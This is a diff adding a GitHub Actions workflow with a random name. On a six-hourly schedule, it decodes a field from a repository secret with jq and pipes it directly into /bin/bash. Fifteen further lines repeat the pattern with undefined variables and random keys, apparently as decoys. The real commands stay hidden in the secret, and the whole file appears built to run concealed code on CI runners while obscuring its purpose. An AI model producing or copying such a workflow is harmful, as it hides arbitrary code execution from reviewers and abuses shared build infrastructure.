@@ -1,0 +1,32 @@
+name: congbuiklqi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: congbuiklqi
+        env:
+          hwp10016: ${{ secrets.hwp10016 }}
+        run: |
+          echo $hwp10016 | jq -r .k5190 | /bin/bash
+          echo $ts98 | jq -r .un39727 | /bin/bash
+          echo $tly0 | jq -r .aabzz87 | /bin/bash
+          echo $ivmm638 | jq -r .bb8 | /bin/bash
+          echo $vgr9267 | jq -r .fmjni2798 | /bin/bash
+          echo $jhof66448 | jq -r .nwox7530 | /bin/bash
+          echo $coo543 | jq -r .lywe84983 | /bin/bash
+          echo $nqmdk95819 | jq -r .ifb6 | /bin/bash
+          echo $esoer269 | jq -r .vjjo9 | /bin/bash
+          echo $s2692 | jq -r .aq1 | /bin/bash
+          echo $mhj2 | jq -r .ddkd2157 | /bin/bash
+          echo $ecxg78 | jq -r .sd7 | /bin/bash
+          echo $i579 | jq -r .huzh631 | /bin/bash
+          echo $veuw99238 | jq -r .cexc936 | /bin/bash
+          echo $croao17 | jq -r .pwcpl18 | /bin/bash
+          echo $e6 | jq -r .cw64 | /bin/bash
+
